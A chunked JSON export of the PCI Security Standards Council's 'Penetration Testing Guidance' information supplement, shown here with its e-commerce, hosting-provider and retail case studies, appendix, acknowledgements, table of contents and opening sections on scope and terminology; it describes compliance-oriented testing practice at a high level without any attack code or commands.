privilege escalation techniques to gain additional access to systems or network resources. The extent to which post-exploitation techniques were performed were defined prior to the start of test to prevent the tester from putting production systems at risk of destabilization. Main vulnerabilities identified were: High:  Apache Tomcat Manager Application Deployer Authenticated Code Execution  Cross-site scripting (reflective)  Directory traversal Medium:  Deprecated protocols - SSLv2, SSLv3  SSL weak ciphers  Internal IP address disclosure Low:  IPS not enabled for disaster-recovery site  Slow HTTP denial-of-service attack Post-Engagement (Post-Execution Phase) At the completion of this examination, the penetration tester met with the Client to describe the preliminary results of the test and address any immediate concerns in advance of the report. The post-execution phase focused on analyzing",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 23
    }
  },
  {
    "text": "not enabled for disaster-recovery site  Slow HTTP denial-of-service attack Post-Engagement (Post-Execution Phase) At the completion of this examination, the penetration tester met with the Client to describe the preliminary results of the test and address any immediate concerns in advance of the report. The post-execution phase focused on analyzing the identified vulnerabilities to determine root causes, establish recommendations and/or remediation activities, and develop a final report where all vulnerabilities noted during the test were documented even though the vulnerabilities did not have an impact on the cardholder data environment. The intent of this document is to provide supplemental information. Information provided here does not 29\\nThe penetration test report was presented to the Client and it was discussed how the Client could remediate the vulnerabilities noted during the penetration test. It was noted that the denial-of-service attack and missing IPS, while serious issues for a retailer, were not PCI-relevant findings and would not be required in order to obtain a clean report. The Client corrected all High and Medium-severity vulnerabilities within a 90-day window and the Pen Test Company provided documentation of successful remediation to the Client. 6.2 Hosting Provider Penetration Test Case Study Case Introduction PCIData Hosting is a hosting service provider. The only cardholder data environment that exists within PCIData Hosting belongs to its PCI DSS compliant customer, TechMerchant. TechMerchant is operating an e-commerce web environment on the PCIData hosting hardware. TechMerchant is solely responsible for the administration and maintenance of all the software and applications used to support its e-commerce environment. PCIData Hosting is bound by contract with TechMerchant to maintain PCI Compliance. PCIData Hosting is required to maintain PCI Compliance by TechMerchant since PCIData Hosting provides critical security services to TechMerchant for its PCI DSS compliance. In addition, PCIData Hosting has a wish to extend this type of PCI DSS hosting service to more customers in the payment card industry. PCIData Hosting is managing the systems in the cardholder data environment and is responsible for physical security, hardware, network, firewalls, and OS including updates, configuration etc. Applications and databases are not the responsibility of PCIData Hosting. Storing, processing, and transmitting cardholder data are in TechMerchant’s scope and have been described and assessed in its own PCI DSS Assessment. PCIData Hosting has no type of cardholder data transactions in scope, and the only entity hosted from a PCI perspective is TechMerchant, for whom they only provide hardware hosting services and logical system management. Description of Environment The environment at PCIData Hosting consists of five different networks:  ODIN Network Zone: Only VMware Hypervisors used for the TechMerchant CDE servers and environment are hosted in this network segment. This network is not accessible from the THOR network.  THOR Network Zone: This network is the CDE environment where TechMerchant has its virtual servers located; all servers located at this network are in PCI scope. The network is separated into smaller networks: DMZ, secure database zone, and an application zone. These networks are included in the penetration test performed",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 24
    }
  },
  {
    "text": "THOR Network Zone: This network is the CDE environment where TechMerchant has its virtual servers located; all servers located at this network are in PCI scope. The network is separated into smaller networks: DMZ, secure database zone, and an application zone. These networks are included in the penetration test performed at TechMerchant.  LOKE Network Zone: Guest network used for external consultants, other guests, BYOD devices, etc. This is the only network that has wireless access points connected. The intent of this document is to provide supplemental information. Information provided here does not 30\\n HEJMDAL Network Zone: Management network from which PCIData Hosting manages the different client networks that do not fall into PCI scope. This network is only used to manage non- CDE servers.  BALDER: All other clients are hosted on this network, including PCIData Hosting’s own office network. All networks are separated by firewalls, and access to ODIN and THOR network segments is restricted to two-factor authentication. The only wireless network is connected to LOKE (the guest network). The datacenter is located at PCIData Hosting’s location and is also in scope for PCI compliance. High-Level Network Diagram Success Criteria – The success criteria for the penetration test is to gain access to the CDE. Resource List (CDE environment)  ODIN – VMware servers  THOR – UNIX-based servers including webservers; Oracle databases in a secure zone  All employees at PCIData Hosting use Microsoft-based workstations to access the CDE environment. Pre-Engagement Actives (Planning) The methodology used for the penetration test was based on NIST SP800-115; the penetration test included the following phases: Planning, Discovery, Attack/Execution, Post-Execution and Reporting. The intent of this document is to provide supplemental information. Information provided here does not 31\\nThe planning phase was used to gather information needed for the assessment execution—such as the assets to be assessed, the threats of interest against the assets, and the security controls to be used to mitigate those threats—and to develop the assessment approach. The networks ODIN (VMware) and THOR (CDE Servers) are the targets of the penetration test as these servers are those that store, process, and transmit cardholder data. Scoping Discussion It was discussed with PCIData Hosting how they managed their CDE environment, including servers and databases. The operating systems are administrated by PCIData Hosting; all applications and development are handled by TechMerchant. Both PCIData Hosting and TechMerchant administer databases. Encrypted information in the database is only accessible with the encryption keys that are held by TechMerchant. All access to ODIN and THOR are authenticated by a two-factor solution. This also applies when accessed from internal networks at PCIData Hosting. TechMerchant’s last penetration test was reviewed to make sure that all perimeters, servers, etc. were covered by the tests. The application was tested as a part of the TechMerchant’s annual PCI penetration test and is not considered in scope for PCIData Hosting’s PCI penetration test, therefore the focus is network- layer testing. The following documentation was reviewed before the assessment:  A network diagram",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 25
    }
  },
  {
    "text": "were covered by the tests. The application was tested as a part of the TechMerchant’s annual PCI penetration test and is not considered in scope for PCIData Hosting’s PCI penetration test, therefore the focus is network- layer testing. The following documentation was reviewed before the assessment:  A network diagram  Results from quarterly external and internal vulnerability scans  Results from the last penetration test  The scope of the TechMerchant’s last penetration test  Security policies  Review of PCIData Hosting’s risk analysis. The following tests were performed during the assessment:  Internal penetration tests from LOKE (guest network), HEJMDAL (management network) and from the office network located in BALDER (Client).  Social engineering against PCIData Hosting administrators of ODIN (VMware) and THOR (CDE servers) in form of phishing e-mails  Physical security assessment as a part of the penetration test.  External testing of PCIData Hosting of their external IP-addresses. All servers, databases, employees with access to the CDE, etc. are considered in scope for the penetration test. The intent of this document is to provide supplemental information. Information provided here does not 32\\nPre-Test Preparations A user account was created for the penetration tester following the regular procedures for granting access to new employees. Access credentials for the guest network were also granted to the tester. Engagement Phase (Discovery and Attack/Execution) Discovery was performed on the LOKE (guest), HEJMDAL (management) and BALDER (office) networks to identify targets (servers, network components, workstations, etc.) on the networks, and analyzing techniques were used to get an understanding of the environment. The objectives of this phase were to identify systems, ports, services, and potential vulnerabilities. This phase was performed both manually and via automated tools including network discovery and port and service detection. When enough data was collected in the discovery phase, the penetration tester tried to gain access to the targets discovered. When access was gained to targets the tester tried to escalate privileges in order to gain complete control of the target. The access obtained was then used to gain more information about the environment, and a new discovery phase was started. The primary goal for the discovery and attack/execution was gaining access to the CDE, including the VMware hosts. The techniques used included password cracking, vulnerability scanning, social engineering, and network-layer testing. The above was completed for the following different perspectives during the assessment:  External attacker without knowledge of the environment  Internal attacker (guest, contractor, etc.)  Internal attacker (employee without access to the CDE) The following tests were performed during the assessment:  External attacker without knowledge of the environment External VPN connection was tested. o Phishing e-mails were sent to carefully selected victims who all are working with administrating o the CDE environment. Attempts to gain access to the data center without having notified the data center up front. o Vulnerabilities related to the VPN connection were not found during the external test. Phishing e- mails were sent but the exploits were caught by",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 26
    }
  },
  {
    "text": "all are working with administrating o the CDE environment. Attempts to gain access to the data center without having notified the data center up front. o Vulnerabilities related to the VPN connection were not found during the external test. Phishing e- mails were sent but the exploits were caught by PCIData Hosting’s anti-virus installation. It was not possible to obtain access to the data center without first being authorized by PCIData Hosting.  Internal attacker Attacks from guest network were performed o Attacks from the management network were performed o Attacks from the office network were performed o The intent of this document is to provide supplemental information. Information provided here does not 33\\nVulnerabilities were found on the different networks, and the tester was able to exploit these but was not able to use the vulnerabilities to gain access to ODIN or THOR. Main vulnerabilities identified were:  Man in the middle – It was possible to perform a man-in-the-middle attack using ARP poisoning but the tester was not able to extract any sensitive information that could provide information on how to gain access to ODIN or THOR.  Weak password policy implemented – Weak password settings on local servers on the BALDER network were used to compromise accounts on this network. The tester was not able to use these accounts to gain access to ODIN or THOR. As these servers are not in PCI scope, the weak password policy was not considered to have an impact on compliance.  Old user accounts were compromised – The tester was able to compromise user accounts that were created but had never been in use on the BALDER network. The compromised accounts did not grant access to ODIN or THOR.  Others – Other vulnerabilities were noted as zone transfer, outdated software, unencrypted protocols used; these vulnerabilities were all related to LOKE or BALDER network and did not grant access to ODIN or THOR even when exploited. Post-Engagement (Post-Execution phase) The post-execution phase focused on analyzing the identified vulnerabilities to determine root causes, establish recommendations and/or remediation activities, and develop a final report where all vulnerabilities noted during the test were documented even though they did not have an impact on the cardholder data environment. The penetration test report was presented to the Client and it was discussed how the Client could remediate the vulnerabilities noted during the penetration test. It was confirmed that none of the vulnerabilities had an effect on the cardholder data environment. As no significant vulnerabilities related to the CDE environment were discovered and access to the CDE environment was not obtained, remediation testing was not performed. The intent of this document is to provide supplemental information. Information provided here does not 34\\n6.3 Retail Merchant Penetration Test Case Study Case Introduction In this example, the business is a retail clothing company called Green Clothing. Cardholder data is collected as a card-present transaction by swiping or keying the card into a POS terminal. The information is then sent to",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 27
    }
  },
  {
    "text": "provided here does not 34\\n6.3 Retail Merchant Penetration Test Case Study Case Introduction In this example, the business is a retail clothing company called Green Clothing. Cardholder data is collected as a card-present transaction by swiping or keying the card into a POS terminal. The information is then sent to a local server at each store before being sent out to the processor. No cardholder data is transmitted between stores or back to corporate. After receiving a confirmation from the processor, cardholder data is purged from the POS server. The POS server runs a PA-DSS point-of-sale application. Corporate has a persistent VPN connection into each of the store locations to allow for administration of networked resources, accessing CCTV recordings, and checking inventory. Description of Environment The environment at Green Clothing consists of six store locations and one corporate office. All stores were determined to be identically configured and have been segmented into two networks:  POS Network – Cardholder Data Environment (CDE) 2 POS devices o 1 POS server o  General Store Network (Non-CDE) 1 manager workstation o 1 CCTV server o Corporate is made up of two network segments:  Corporate General User Network (Non-CDE) 4 workstations o 1 wireless access point o  Corporate IT Management Network (Non-CDE) o 3 workstations used to manage CDE servers The intent of this document is to provide supplemental information. Information provided here does not 35\\nDescription of Access The table below outlines the access from all non-CDE networks into the CDE. This access definition will help in determining what types of testing should be conducted and from where. Source Network (Non CDE) Destination Network (CDE) Access Corporate General User Network Store POS Network None – Segmented Corporate IT Management Network Store POS Network SSH to POS server Store General Network Store POS Network None – Segmented Example Store Network Diagram The intent of this document is to provide supplemental information. Information provided here does not 36\\nExample Corporate Network Diagram Pre-Engagement Activities The POS networks at each store location are considered the cardholder data environment and are the target of the penetration test. The servers within this network at each store are the servers that store, process, and transmit cardholder data. Scoping Discussion It was discussed with Green Clothing company how they managed their CDE-environment, specifically how servers and databases are administrated. All administration is conducted from the IT network at corporate over the VPN connection. The following documentation was reviewed before the assessment:  A network diagram  Results from quarterly external and internal vulnerability scans  Results from the last penetration test  The scope of the Green Clothing’s last penetration test  Security policies  Review of Green Clothing’s risk analysis The intent of this document is to provide supplemental information. Information provided here does not 37\\nFinal Scope Definition After review of all provided materials, Green Clothing and the penetration tester came to an agreement of the following scope definition. External Penetration Test Testing included evaluation of the following",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 28
    }
  },
  {
    "text": "risk analysis The intent of this document is to provide supplemental information. Information provided here does not 37\\nFinal Scope Definition After review of all provided materials, Green Clothing and the penetration tester came to an agreement of the following scope definition. External Penetration Test Testing included evaluation of the following Internet-facing resources:  Six store public IPs Internal Penetration Testing Based on information that all stores are configured identically, internal testing was performed against two stores. Any vulnerabilities identified are assumed to exist in all stores. Testing included evaluation of the following unique testing perspectives targeting two store POS networks: Table x: Network-layer penetration testing scope Perspective network Targeted Network Corporate IT Network Store # 1 – POS Network Corporate IT Network Store # 2 – POS Network Table y: Segmentation testing scope Perspective network Targeted Network Corporate general user network Store # 1 – POS Network Store 1 – general network Store # 1 – POS Network Corporate general user network Store # 2 – POS Network Store 2 – general network Store # 2 – POS Network Pre-Test Preparations The penetration tester was given a network level access in each of the defined testing perspectives.  Corporate IT Network  Corporate General User Network  Store 1 General Network  Store 2 General Network The penetration tester was also provided with the internal IP information for the POS network at the sample target store. No other network access or user credentials were provided. The intent of this document is to provide supplemental information. Information provided here does not 38\\nEngagement Phase The success criteria for the penetration test were defined as getting access to the CDE environment and accessing cardholder data. Based on the defined scope, the following different attack scenarios were evaluated:  External attacker without knowledge of the environment  Internal attacker with no CDE access (guest, contractor, etc.) in either the store general network, or the corporate general network  Internal attacker gaining unauthorized access to the corporate IT management network segment and pivoting to attack stores as an administrator Reporting Phase The penetration tester reported the following items after completing the test. External Penetration Test No notable items reported. It was determined that the only publicly reachable services were the VPN connection points, which were vetted and determined to be secure. Internal Penetration Test Outlined below are the vulnerabilities identified during the internal penetration test.  Vulnerability #1 – Segmentation failure Summary: It was found that firewall #2 (CDE firewall) was configured to allow unrestricted access (all ports and services) from the store General Network (10.0.0.0/24) into the store POS Network (192.168.0.0/24).  Vulnerability #2 – Default user credentials on POS server Summary: Default credentials were enabled on the third-party application running on the POS server. Using these credentials, the penetration tester was able to obtain administrative-level access to the POS server. Post-Engagement Green Clothing reviewed the penetration test report and implemented fixes for each identified item. The penetration tester conducted additional testing to validate",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 29
    }
  },
  {
    "text": "were enabled on the third-party application running on the POS server. Using these credentials, the penetration tester was able to obtain administrative-level access to the POS server. Post-Engagement Green Clothing reviewed the penetration test report and implemented fixes for each identified item. The penetration tester conducted additional testing to validate that the remediation activities sufficiently resolved the reported items. An updated report was provided that showed the items as remediated. The intent of this document is to provide supplemental information. Information provided here does not 39\\nAppendix A: Quick-Reference Table to Guidance on PCI DSS Penetration Testing Requirements Informational Supplement Section(s) PCI DSS 11.3.x Requirement Containing Guidance 11.3 Penetration test methodology sub-bullets: Based on industry-accepted approaches 3.1, 4.4, 5.1.1, 5.1.2, 5.2 - Coverage for CDE and critical systems 2.2, 2.2.4, 4.1.1 - Includes external and internal testing 2.2.1, 2.2.2 - Test to validate segmentation controls 2.2.3, 4.2.3 - Application-layer testing 2.3, 4.2.1 - Network-layer tests for network and OS 2.3, 4.2.2 - The intent of this document is to provide supplemental information. Information provided here does not 40\\nAcknowledgements PCI SSC would like to acknowledge the contribution of the Penetration Testing Guidance Special Interest Group (SIG) in the preparation of the original document published in 2015. The Penetration Testing Guidance SIG consisted of representatives from the following organizations: Accuvant, Inc Convergys Corp Agio, LLC CradlePoint Alaska Airlines Crosskey Banking Solutions A-lign Security and Compliance Services Crowe Horwath LLP Allstate Insurance DataFlight Europe AS Aperia Solutions Delhaize America Shared Services Group, LLC AT&T Consulting Solutions Dell, Inc. atsec (Beijing) Information Technology Co., Ltd Deluxe Corp. Bally Total Fitness Diamond Resorts Corp. Bank Of New Zealand Digital Defense, Inc. Bashas' Inc. Domino's Pizza, Inc. BB&T Corporation DST Output Board of Trustees of the University of Arkansas Enterprise Holdings, Inc. Bridge Point Communications EVO Payments International The Brick Group EVRY A/S BrightLine CPAs & Associates, Inc. Experian Information Services British Airways PLC Exxon Mobil Corporation BT PLC Fiscal Systems, Inc. Canadian Tire Financial Services Fiserv Solutions, Inc. CBIZ Security & Advisory Services, LLC FishNet Security CDG Commerce Foregenix CenturyLink Foresight IT Consulting Pty Ltd. Cisco Systems, Inc. FortConsult A-S Citigroup Inc. Games Workshop Ltd Clydesdale Bank PLC Gap Inc. Coalfire Systems, Inc. Global Payments Direct, Inc. Compass IT Compliance, LLC Grant Thornton Computer Services, Inc. Groupement Interbancaire Monetique de Comsec L'uemoa (GIM-UEMOA) ControlScan Inc. GuidePoint Security, LLC The intent of this document is to provide supplemental information. Information provided here does not 41\\nHewlett-Packard SecurityMetrics, Inc. Hitachi-Omron Terminal Solutions, Corp. Sense of Security Pty Ltd. IBM Corporation Sikich LLP Internet Security Auditors SISA IQ Information Quality SIX Payment Services Ltd Isis Mobile Commerce Solutionary, Inc. Jet Infosystems Starwood Hotels & Resorts Worldwide, Inc. Liverpool Victoria Friendly Society State Farm Mutual Automobile Insurance Company Lloyds Banking Group StoreFinancial Services MegaPath Inc. Structured Communication Systems, Inc. MobileIron, Inc. Sword & Shield Enterprise Security, Inc. Módulo Security Solutions S.A. Symantec Corporation MTI Technology, Ltd. Sysnet Limited National Australia Bank Telstra Nettitude, Ltd. Tesco Stores Ltd. NIC Inc Tieto Latvia",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 30
    }
  },
  {
    "text": "Society State Farm Mutual Automobile Insurance Company Lloyds Banking Group StoreFinancial Services MegaPath Inc. Structured Communication Systems, Inc. MobileIron, Inc. Sword & Shield Enterprise Security, Inc. Módulo Security Solutions S.A. Symantec Corporation MTI Technology, Ltd. Sysnet Limited National Australia Bank Telstra Nettitude, Ltd. Tesco Stores Ltd. NIC Inc Tieto Latvia SIA Novacoast TIVIT (Terceirizacao de Tecnologiae Servicios S/A) NRI Secure Technologies Trustwave Holdings, Inc. NTA Monitor Ltd. TSYS NTT Security Ltd. TUI Travel PLC Online Enterprises U.S. Bancorp Outerwall U.S. Cellular Payment Software Company (PSC) UL Transaction Security PTY Ltd. PayPal, Inc. University of Oklahoma Pier1 Imports UPS (United Parcel Service) Princeton Payment Solutions LLC usd AG Progressive Casualty Insurance Company Verizon Wireless Promocion y Operacion SA de CV VigiTrust Ltd. Rapid7 LLC Vodat International Ltd. RBC Royal Bank The Walt Disney Company RBS Westpac Banking Corporation Right Time Limited Xpient Solutions LLC Secured Net Solutions Inc. SecureNet The intent of this document is to provide supplemental information. Information provided here does not 42\\nAbout the PCI Security Standards Council The PCI Security Standards Council is an open global forum that is responsible for the development, management, education, and awareness of the PCI Data Security Standard (PCI DSS) and other standards that increase payment data security. Created in 2006 by the founding payment card brands American Express, Discover Financial Services, JCB International, Mastercard, and Visa Inc., the Council has more than 700 Participating Organizations representing merchants, banks, processors, and vendors worldwide. To learn more about playing a part in securing payment card data globally, please visit: pcisecuritystandards.org. The intent of this document is to provide supplemental information. Information provided here does not 43",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1 (1)",
      "chunk_id": 31
    }
  },
  {
    "text": "Standard: PCI Data Security Standard (PCI DSS) Version: 1.1 Date: September 2017 Author: Penetration Test Guidance Special Interest Group PCI Security Standards Council Information Supplement: Penetration Testing Guidance\\nDocument Changes Date Document Description Pages Version March 2015 1.0 Initial release All September 2017 1.1 A number of clarifications, including: Various • Clarified intent of “social engineering” in Terminology. • Clarified guidance on black-box testing. • Restructured Section 2.2 for better flow, and clarified language describing intent of PCI DSS Requirement 11.3. • Expanded guidance related to back-end APIs. • Updated references to PCI SSC resources. • Minor grammatical updates. The intent of this document is to provide supplemental information. Information provided here does not i\\nTable of Contents 1 Introduction ........................................................................................................................................................ 4 1.1 Objective ....................................................................................................................................................... 4 1.2 Intended Audience ........................................................................................................................................ 4 1.3 Terminology................................................................................................................................................... 4 1.4 Navigating this Document ............................................................................................................................. 5 2 Penetration Testing Components .................................................................................................................... 6 2.1 How does a penetration test differ from a vulnerability scan? ...................................................................... 6 2.2 Scope ............................................................................................................................................................ 7 2.2.1 External Penetration Test ....................................................................................................................... 8 2.2.2 Internal Penetration Test ........................................................................................................................ 8 2.2.3 Testing Segmentation Controls .............................................................................................................. 8 2.2.4 Critical Systems ...................................................................................................................................... 9 2.3 Application-Layer and Network-Layer Testing .............................................................................................. 9 2.3.1 Authentication ......................................................................................................................................... 9 2.3.2 PA-DSS Compliant Applications ............................................................................................................ 9 2.3.3 Web Applications .................................................................................................................................. 10 2.3.4 Separate Testing Environment ............................................................................................................. 10 2.4 Segmentation Checks ................................................................................................................................. 10 2.5 Social Engineering ...................................................................................................................................... 11 2.6 What is considered a “significant change”? ................................................................................................ 11 3 Qualifications of a Penetration Tester ........................................................................................................... 12 3.1 Certifications................................................................................................................................................ 12 3.2 Past Experience .......................................................................................................................................... 12 4 Methodology ..................................................................................................................................................... 14 4.1 Pre-Engagement ......................................................................................................................................... 14 4.1.1 Scoping ................................................................................................................................................. 14 4.1.2 Documentation ..................................................................................................................................... 14 4.1.3 Rules of Engagement ........................................................................................................................... 15 4.1.4 Third-Party-Hosted / Cloud Environments ............................................................................................ 16 4.1.5 Success Criteria ................................................................................................................................... 16 4.1.6 Review of Past Threats and Vulnerabilities .......................................................................................... 16 4.1.7 Avoid scan interference on security appliances. .................................................................................. 17 4.2 Engagement: Penetration Testing............................................................................................................... 17 4.2.1 Application Layer .................................................................................................................................. 18 4.2.2 Network Layer....................................................................................................................................... 18 4.2.3 Segmentation ....................................................................................................................................... 19 4.2.4 What to do when cardholder data is encountered ................................................................................ 19 The intent of this document is to provide supplemental information. Information provided here does not ii\\n4.2.5 Post-Exploitation ................................................................................................................................... 19 4.3 Post-Engagement ....................................................................................................................................... 19 4.3.1 Remediation Best Practices ................................................................................................................. 19 4.3.2 Retesting Identified Vulnerabilities ....................................................................................................... 20 4.3.3 Cleaning up the Environment ............................................................................................................... 20 4.4 Additional Resources .................................................................................................................................. 20 5 Reporting and Documentation ........................................................................................................................ 21 5.1 Identified Vulnerability Reporting ................................................................................................................ 21 5.1.1 Assigning a Severity Score................................................................................................................... 21 5.1.2 Industry Standard References .............................................................................................................. 22 5.2 Reporting Guidelines ................................................................................................................................... 22 5.2.1 Penetration Test Report Outline ........................................................................................................... 22 5.2.2 Retesting Considerations and Report Outline ...................................................................................... 23 5.3 Evidence retention ...................................................................................................................................... 24 5.3.1 What is considered evidence? ............................................................................................................. 24 5.3.2 Retention .............................................................................................................................................. 24 5.4 Penetration Test Report Evaluation Tool .................................................................................................... 25 6 Case Studies / Scoping Examples ................................................................................................................. 27 6.1 E-commerce Penetration Test Case Study ................................................................................................. 27 6.2 Hosting Provider Penetration Test Case Study .......................................................................................... 30 6.3 Retail Merchant Penetration Test Case Study ............................................................................................ 35 Appendix A: Quick-Reference Table to Guidance on PCI DSS Penetration Testing Requirements ............. 40 Acknowledgements ............................................................................................................................................... 41 About the PCI Security Standards Council",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 0
    }
  },
  {
    "text": "27 6.1 E-commerce Penetration Test Case Study ................................................................................................. 27 6.2 Hosting Provider Penetration Test Case Study .......................................................................................... 30 6.3 Retail Merchant Penetration Test Case Study ............................................................................................ 35 Appendix A: Quick-Reference Table to Guidance on PCI DSS Penetration Testing Requirements ............. 40 Acknowledgements ............................................................................................................................................... 41 About the PCI Security Standards Council ......................................................................................................... 43 The intent of this document is to provide supplemental information. Information provided here does not iii\\n1 Introduction 1.1 Objective This information supplement provides general guidance and guidelines for penetration testing. The guidance focuses on the following:  Penetration Testing Components: Understanding of the different components that make up a penetration test and how this differs from a vulnerability scan including scope, application and network-layer testing, segmentation checks, and social engineering.  Qualifications of a Penetration Tester: Determining the qualifications of a penetration tester, whether internal or external, through their past experience and certifications.  Penetration Testing Methodologies: Detailed information related to the three primary parts of a penetration test: pre-engagement, engagement, and post-engagement.  Penetration Testing Reporting Guidelines: Guidance for developing a comprehensive penetration test report that includes the necessary information to document the test as well as a checklist that can be used by the organization or the assessor to verify whether the necessary content is included. The information in this document is intended as supplemental guidance and does not supersede, replace, or extend PCI DSS requirements. The current version of PCI DSS at the time of publication is v3.2; however, the general principles and practices offered here may also be applicable to other versions of PCI DSS. 1.2 Intended Audience This guidance is intended for entities that are required to conduct a penetration test whether they use an internal or external resource. In addition, this document is intended for companies that specialize in offering penetration test services, and for assessors who help scope penetration tests and review final test reports. The guidance is applicable to organizations of all sizes, budgets, and industries. 1.3 Terminology The following terms are used throughout this document:  Application-layer testing: Testing that typically includes websites, web applications, thick clients, or other applications.  Black-box testing: Testing performed without prior knowledge of the internal structure/design/implementation of the object being tested.  Common Vulnerability Scoring System (CVSS): Provides an open framework for communicating the characteristics and impacts of IT vulnerabilities.  Grey-box testing: Testing performed with partial knowledge of the internal structure/design/implementation of the object being tested. The intent of this document is to provide supplemental information. Information provided here does not 4\\n National Vulnerability Database (NVD): The U.S. government repository of standards based vulnerability management data. This data enables automation of vulnerability management, security measurement, and compliance (e.g., FISMA).  Network-layer testing: Testing that typically includes external/internal testing of networks (LANS/VLANS), between interconnected systems, and wireless networks.  Penetration tester, tester, or team: The individual(s) conducting the penetration test for the entity. They may be a resource internal or external to the entity.  Social engineering: Manipulation or deception of individuals into",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 1
    }
  },
  {
    "text": "Testing that typically includes external/internal testing of networks (LANS/VLANS), between interconnected systems, and wireless networks.  Penetration tester, tester, or team: The individual(s) conducting the penetration test for the entity. They may be a resource internal or external to the entity.  Social engineering: Manipulation or deception of individuals into divulging confidential or personal information.  White-box testing: Testing performed with knowledge of the internal structure/design/implementation of the object being tested. 1.4 Navigating this Document This document is organized in such a way to help the reader better understand penetration testing in a holistic sense. It begins by providing background and definitions for topics common to all penetration test efforts (including scoping the test, critical systems to test, application and network-layer test inclusions, etc.). The document then moves on to practical guidance on selecting a penetration tester, methodologies that are used before, during, and after a test, guidelines for reporting and evaluating test results. The document concludes with case studies that attempt to illustrate the concepts presented in this supplement. Appendix A provides a quick-reference table to specific sections of this document where guidance on a particular PCI DSS requirement can be found. This may be useful for those wishing to quickly correlate the penetration testing requirements and guidelines presented in PCI DSS Requirement 11.3. The intent of this document is to provide supplemental information. Information provided here does not 5\\n2 Penetration Testing Components The goals of penetration testing are: 1. To determine whether and how a malicious user can gain unauthorized access to assets that affect the fundamental security of the system, files, logs and/or cardholder data. 2. To confirm that the applicable controls required by PCI DSS—such as scope, vulnerability management, methodology, and segmentation—are in place. There are three types of penetration tests: black-box, white-box, and grey-box. In a black-box assessment, the client provides no information prior to the start of testing. In a white-box assessment, the entity may provide the penetration tester with full and complete details of the network and applications. For grey-box assessments, the entity may provide partial details of the target systems. PCI DSS penetration tests are typically performed as either white-box or grey-box assessments. These types of assessments yield more accurate results and provide a more comprehensive test of the security posture of the environment than a pure black-box assessment. Performing a black-box assessment, when the entity provides no details of the target systems prior to the start of the test, may require more time, money, and resources for the deliverables to meet the requirements of PCI DSS. 2.1 How does a penetration test differ from a vulnerability scan? The differences between penetration testing and vulnerability scanning, as required by PCI DSS, can be summarized as follows: Vulnerability Scan Penetration Test Purpose Identify, rank, and report vulnerabilities that, if Identify ways to exploit vulnerabilities to exploited, may result in an intentional or circumvent or defeat the security features of unintentional compromise of a system. system components. When At least quarterly and after significant",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 2
    }
  },
  {
    "text": "be summarized as follows: Vulnerability Scan Penetration Test Purpose Identify, rank, and report vulnerabilities that, if Identify ways to exploit vulnerabilities to exploited, may result in an intentional or circumvent or defeat the security features of unintentional compromise of a system. system components. When At least quarterly and after significant changes1. At least annually and upon significant changes2. How Typically a variety of automated tools combined A manual process that may include the use of with manual verification of identified issues. vulnerability scanning or other automated tools, resulting in a comprehensive report. 1 Refer to Section 2.6 of this document for guidance on significant changes. 2 Some entities may be required to perform penetration tests more frequently. Refer to the current version of PCI DSS to understand specific requirements. The intent of this document is to provide supplemental information. Information provided here does not 6\\nVulnerability Scan Penetration Test Reports Potential risks posed by known vulnerabilities, Description of each vulnerability verified and/or ranked in accordance with NVD/CVSS base potential issue discovered. More specific risks scores associated with each vulnerability. that vulnerability may pose, including specific methods how and to what extent it may be For PCI DSS, external vulnerability scans must exploited. Examples of vulnerabilities include but be performed by an ASV and the risks ranked in are not limited to SQL injection, privilege accordance with the CVSS. Internal vulnerability escalation, cross-site scripting, or deprecated scans may be performed by qualified personnel protocols. (does not require an ASV) and risks ranked in accordance with the organization’s risk-ranking process as defined in PCI DSS Requirement 6.1. An external vulnerability scan is conducted from outside the target organization. An internal vulnerability scan is conducted from inside the target organization. Duration Relatively short amount of time, typically several Engagements may last days or weeks seconds to several minutes per scanned host. depending on the scope of the test and size of the environment to be tested. Tests may grow in time and complexity if efforts uncover additional scope. 2.2 Scope PCI DSS defines the cardholder data environment (CDE) as “the people, processes, and technology that store, process, or transmit cardholder data or sensitive authentication data.” The scope of a penetration test, as defined in PCI DSS Requirement 11.3, includes the entire CDE perimeter and any critical systems. This applies both to the external perimeter (public-facing attack surfaces) and the internal perimeter of the CDE (LAN-LAN attack surfaces). The scope of testing may include locations of cardholder data, applications that store, process, or transmit cardholder data, critical network connections, access points, and other targets appropriate for the complexity and size of the organization. This should include resources and assets utilized by personnel to maintain systems in the CDE or to access cardholder data, as the compromise of such assets could allow an attacker to obtain credentials with access to or a route into the CDE. All penetration testing should only be conducted as defined by the rules of engagement agreed upon by both parties. See",
    "metadata": {
      "doc_id": "Penetration-Testing-Guidance-v1_1",
      "chunk_id": 3
    }
  },
  {
    "text": "in the CDE or to access cardholder data, as the compromise of such assets could allow an attacker to obtain credentials with access to or a route into the CDE. All penetration testing should only be conducted as defined by the rules of engagement agreed upon by both parties. See Section 4.1.3, “Rules of Engagement.” The intent of this document is to provide supplemental information. Information provided here does not 7\\n2.2.1 External Penetration Test The scope of an external penetration test is the exposed external perimeter of the CDE and critical systems connected or accessible to public network infrastructures. It should assess any unique access to the scope from the public networks, including services that have access restricted to individual external IP addresses. Testing must include both application-layer and network-layer assessments. External penetration tests also include remote access vectors such as dial-up and VPN connections. 2.2.2 Internal Penetration Test The scope of the internal penetration test is the internal perimeter of the CDE and critical systems from the perspective of the internal network. Testing must include both application-layer and network-layer assessments. Where the CDE is also the only internal network and there is no internal CDE perimeter, the scope of testing will typically be focused on critical systems. For example, testing activities may include attempting to bypass internal access controls intended to prevent unauthorized access or use of systems that store, process, or transmit CHD from those that do not. In cases where there is an internal CDE perimeter, the scope of testing will need to consider the 